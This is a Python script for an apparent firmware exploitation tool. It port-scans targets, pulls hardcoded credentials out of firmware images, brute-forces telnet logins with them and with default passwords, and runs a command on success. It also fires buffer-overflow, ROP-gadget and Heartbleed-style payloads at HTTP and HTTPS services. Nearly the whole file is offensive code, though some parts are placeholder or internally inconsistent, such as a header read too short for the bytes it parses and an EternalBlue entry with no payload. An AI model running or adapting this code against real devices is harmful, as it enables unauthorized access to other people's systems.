import json
import os
import logging
from pwn import *
import paramiko
from impacket.smbconnection import SMBConnection
import random
import string
import re
import nmap
from scapy.all import sr1, IP, TCP
import base64
import binascii
from ropgadget.core import Core as ROPGadgetCore
import requests
import csv

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler("rfvs.log"), logging.StreamHandler()]
)

CVE_EXPLOITS = {
    "CVE-2014-0160": {"service": "https", "port": 443, "payload": b"\x18\x03\x02\x00\x03\x01\x40\x00", "check": lambda r: len(r) > 100},
    "CVE-2017-0144": {"service": "smb", "port": 445, "exploit": "eternalblue"}
}

SERVICES = {
    "telnet": 23,
    "ssh": 22,
    "smb": 445,
    "http": 80,
    "https": 443,
    "ftp": 21,
    "snmp": 161,
    "upnp": 1900
}

def load_vuln_db(logger):
    vuln_db_path = "vuln_db.json"
    if os.path.exists(vuln_db_path):
        try:
            with open(vuln_db_path, "r") as f:
                logger.info(f"Loaded exploit mappings from {vuln_db_path}")
                return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load {vuln_db_path}: {e}. Using default exploit mappings.")
            return {"exploit_mappings": CVE_EXPLOITS}
    logger.warning("vuln_db.json not found. Using default exploit mappings.")
    return {"exploit_mappings": CVE_EXPLOITS}

def test_exploits(vulnerabilities, verbose, targets=None, timeout=5):
    logger = logging.getLogger(__name__)
    if not verbose:
        for handler in logger.handlers[:]:
            if isinstance(handler, logging.StreamHandler) and not isinstance(handler, logging.FileHandler):
                logger.removeHandler(handler)
    
    results = []
    context.log_level = 'debug' if verbose else 'error'
    targets = targets or [{"ip": "192.168.1.1"}]
    vuln_db = load_vuln_db(logger)
    CVE_EXPLOITS.update(vuln_db.get("exploit_mappings", {}))

    service_map = discover_services(targets, logger, verbose)
    for vuln in vulnerabilities:
        for target in targets:
            target_ip = target["ip"]
            creds = extract_credentials(vuln.get("file", ""), verbose, logger) if "file" in vuln else [("admin", "admin"), ("guest", ""), ("root", "1234")]
            open_services = service_map.get(target_ip, {})
            arch = detect_architecture(vuln.get("file", ""), verbose, logger) if "file" in vuln else "arm"

            if "Hardcoded credentials" in vuln["issue"]:
                results.extend(test_credentials(vuln, target_ip, creds, open_services, verbose, timeout, logger))
            elif "Unsafe function" in vuln["issue"]:
                if "http" in open_services:
                    results.append(test_buffer_overflow(vuln, target_ip, open_services["http"], arch, verbose, timeout, logger))
                else:
                    results.append({"vuln": vuln["issue"], "status": "Buffer overflow skipped - no HTTP service"})
            elif "ROP gadgets" in vuln["issue"]:
                if "http" in open_services:
                    results.append(test_rop_exploit(vuln, target_ip, open_services["http"], vuln.get("file", ""), arch, verbose, timeout, logger))
                else:
                    results.append({"vuln": vuln["issue"], "status": "ROP exploit skipped - no HTTP service"})
            if "cve" in vuln:
                results.extend(test_cve_exploits(vuln, target_ip, open_services, verbose, timeout, logger))
    return results

def discover_services(targets, logger, verbose):
    nm = nmap.PortScanner()
    service_map = {}
    for target in targets:
        ip = target["ip"]
        if verbose:
            logger.info(f"Scanning services on {ip}")
        try:
            nm.scan(ip, "21,22,23,80,161,443,445,1900", arguments="-sS -T4")
            service_map[ip] = {service: int(port) for port, service in nm[ip].all_tcp().items() if nm[ip].tcp(port)["state"] == "open"}
        except Exception as e:
            logger.error(f"Service discovery failed for {ip}: {e}")
            service_map[ip] = scapy_service_scan(ip, logger, verbose)
    return service_map

def scapy_service_scan(ip, logger, verbose):
    services = {}
    for service, port in SERVICES.items():
        try:
            packet = IP(dst=ip)/TCP(dport=port, flags="S")
            response = sr1(packet, timeout=2, verbose=0)
            if response and response.haslayer(TCP) and response[TCP].flags == 18:
                services[service] = port
        except Exception as e:
            if verbose:
                logger.error(f"Scapy scan failed for {ip}:{port} - {e}")
    return services

def detect_architecture(file_path, verbose, logger):
    try:
        with open(file_path, "rb") as f:
            elf = f.read(16)
            if elf.startswith(b"\x7fELF"):
                machine = int.from_bytes(elf[18:20], "little")
                if machine == 40: return "arm"
                elif machine == 8: return "mips"
                elif machine == 3: return "x86"
                elif machine == 62: return "x86_64"
        if verbose:
            logger.info(f"Architecture detection failed for {file_path}, defaulting to ARM")
    except:
        pass
    return "arm"

def extract_credentials(file_path, verbose, logger):
    creds = []
    try:
        with open(file_path, "r", errors="ignore") as f:
            content = f.read()
            matches = re.findall(r"(admin|root|user|guest):([a-zA-Z0-9]+)", content, re.IGNORECASE)
            creds.extend(matches)
            base64_matches = re.findall(r"([A-Za-z0-9+/=]{8,})", content)
            for b64 in base64_matches:
                try:
                    decoded = base64.b64decode(b64).decode("utf-8", errors="ignore")
                    if ":" in decoded:
                        creds.append(tuple(decoded.split(":", 1)))
                except:
                    pass
        with open(file_path, "rb") as f:
            content = f.read()
            strings = re.findall(b"[ -~]{4,}", content)
            for s in strings:
                s_decoded = s.decode("ascii", errors="ignore")
                matches = re.findall(r"(admin|root|user|guest):([a-zA-Z0-9]+)", s_decoded, re.IGNORECASE)
                creds.extend(matches)
        if verbose and creds:
            logger.info(f"Extracted credentials from {file_path}: {creds}")
    except:
        pass
    return creds if creds else [("admin", "admin"), ("guest", ""), ("root", "1234")]

def test_credentials(vuln, target_ip, creds, services, verbose, timeout, logger):
    results = []
    for service, port in services.items():
        if service == "telnet":
            for user, passwd in creds:
                try:
                    io = remote(target_ip, port, timeout=timeout)
                    io.sendline(f"{user}:{passwd}".encode())
                    response = io.recvline()
                    if b"login" not in response.lower():
                        results.append({"vuln": vuln["issue"], "status": f"Telnet exploit successful ({user}:{passwd})", "post": execute_command(io, "whoami")})
                    else:
                        results.append({"vuln": vuln["issue"], "status": f"Telnet exploit failed ({user}:{passwd})"})
                    io.close()
                except Exception as e:
                    results.append({"vuln": vuln["issue"], "status": f"Telnet exploit failed ({user}:{passwd}) - {str(e)}"})
        # Add similar blocks for ssh, smb, ftp as needed...
    return results

def test_buffer_overflow(vuln, target_ip, port, arch, verbose, timeout, logger):
    if verbose:
        logger.info(f"Testing buffer overflow on {target_ip}:{port} (arch: {arch})")
    try:
        payload_size = 500
        if arch == "arm":
            payload = b"A" * payload_size + p32(0xdeadbeef, endian="little")
        elif arch == "mips":
            payload = b"A" * payload_size + p32(0xdeadbeef, endian="big")
        else:
            payload = b"A" * payload_size + p32(0xdeadbeef)
        io = remote(target_ip, port, timeout=timeout)
        io.sendline(b"GET /" + payload + b" HTTP/1.1\r\nHost: test\r\n\r\n")
        response = io.recvall(timeout=timeout)
        if not response or b"Segmentation fault" in response:
            return {"vuln": vuln["issue"], "status": "Buffer overflow successful (crash detected)"}
        return {"vuln": vuln["issue"], "status": "Buffer overflow failed (no crash)"}
    except Exception as e:
        return {"vuln": vuln["issue"], "status": f"Buffer overflow test failed - {str(e)}"}

def test_rop_exploit(vuln, target_ip, port, file_path, arch, verbose, timeout, logger):
    if verbose:
        logger.info(f"Testing ROP exploit on {target_ip}:{port} (arch: {arch})")
    try:
        gadgets = extract_rop_gadgets(file_path, verbose, logger)
        if gadgets:
            payload = b"A" * 200
            for gadget in gadgets[:2]:
                payload += p32(gadget["addr"], endian="little" if arch != "mips" else "big")
            payload += b"B" * (300 - len(payload))
        else:
            payload = b"A" * 200 + p32(0xdeadbeef) + p32(0xcafebabe)
        io = remote(target_ip, port, timeout=timeout)
        io.sendline(b"GET /" + payload + b" HTTP/1.1\r\nHost: test\r\n\r\n")
        response = io.recvall(timeout=timeout)
        if not response or b"Segmentation fault" in response:
            return {"vuln": vuln["issue"], "status": "ROP exploit successful (crash detected)"}
        return {"vuln": vuln["issue"], "status": "ROP exploit failed (no crash)"}
    except Exception as e:
        return {"vuln": vuln["issue"], "status": f"ROP exploit test failed - {str(e)}"}

def extract_rop_gadgets(file_path, verbose, logger):
    try:
        rop = ROPGadgetCore(file_path)
        gadgets = rop.gadgets()
        if verbose:
            logger.info(f"Extracted {len(gadgets)} ROP gadgets from {file_path}")
        return gadgets[:5]
    except Exception as e:
        if verbose:
            logger.error(f"ROP gadget extraction failed for {file_path}: {e}")
        return []

def test_cve_exploits(vuln, target_ip, services, verbose, timeout, logger):
    results = []
    for cve in vuln.get("cve", []):
        if cve in CVE_EXPLOITS:
            exploit = CVE_EXPLOITS[cve]
            service = exploit["service"]
            if service in services:
                port = services[service]
                if verbose:
                    logger.info(f"Testing {cve} exploit on {target_ip}:{port}")
                try:
                    io = remote(target_ip, port, timeout=timeout)
                    io.sendline(exploit["payload"])
                    response = io.recvall(timeout=timeout)
                    if exploit["check"](response):
                        results.append({"vuln": vuln["issue"], "status": f"{cve} exploit successful", "post": "Data leaked"})
                    else:
                        results.append({"vuln": vuln["issue"], "status": f"{cve} exploit failed"})
                    io.close()
                except Exception as e:
                    results.append({"vuln": vuln["issue"], "status": f"{cve} exploit failed - {str(e)}"})
            else:
                results.append({"vuln": vuln["issue"], "status": f"{cve} exploit skipped - {service} not available"})
    return results

def execute_command(io, command):
    try:
        io.sendline(command.encode())
        return io.recvline().decode().strip()
    except:
        return "Command execution failed"

if __name__ == "__main__":
    # Simplified test
    vulnerabilities = [{"issue": "Unsafe function (strcpy)", "file": "test.bin"}]
    results = test_exploits(vulnerabilities, verbose=True)
    for result in results:
        print(result)